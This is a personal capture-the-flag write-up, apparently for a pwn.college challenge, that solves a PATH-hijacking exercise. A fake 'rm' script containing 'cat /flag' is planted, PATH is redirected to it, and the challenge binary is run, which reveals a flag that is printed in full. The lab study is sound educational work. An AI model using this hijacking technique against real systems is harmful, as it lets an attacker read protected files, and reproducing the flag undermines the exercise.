# Hijacking Commands

### Armed with your knowledge, you can now carry out some shenanigans. This challenge is almost the same as the first challenge in this module. Again, this challenge will delete the flag using the rm command. But unlike before, it will not print anything out for you.

How can you solve this? You know that rm is searched for in the directories listed in the PATH variable. You have experience creating the win command when the previous challenge needed it. What else can you create?

**Flag:** `pwn.college{oUQeHhjaS2hZWL1Dq7yIj_dcYYA.QX3cjM1wSO4gjNzEzW}`

```
#!/bin/bash

hacker@path~hijacking-commands:~$ which rm
/run/dojo/bin/rm
hacker@path~hijacking-commands:~$ which cat
/run/dojo/bin/cat
hacker@path~hijacking-commands:~$ cat > /home/hacker/rm
#!/bin/bash
/run/dojo/bin/cat /flag
^C
hacker@path~hijacking-commands:~$ ls -l rm
-rw-r--r-- 1 hacker hacker 36 Oct 11 20:23 rm
hacker@path~hijacking-commands:~$ chmod a+x rm
hacker@path~hijacking-commands:~$ PATH="/home/hacker"
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{oUQeHhjaS2hZWL1Dq7yIj_dcYYA.QX3cjM1wSO4gjNzEzW}
```

## What I learned

I learnt to create a new script and edit the PATH variable to execute that script through /challenge/run

## References

NA
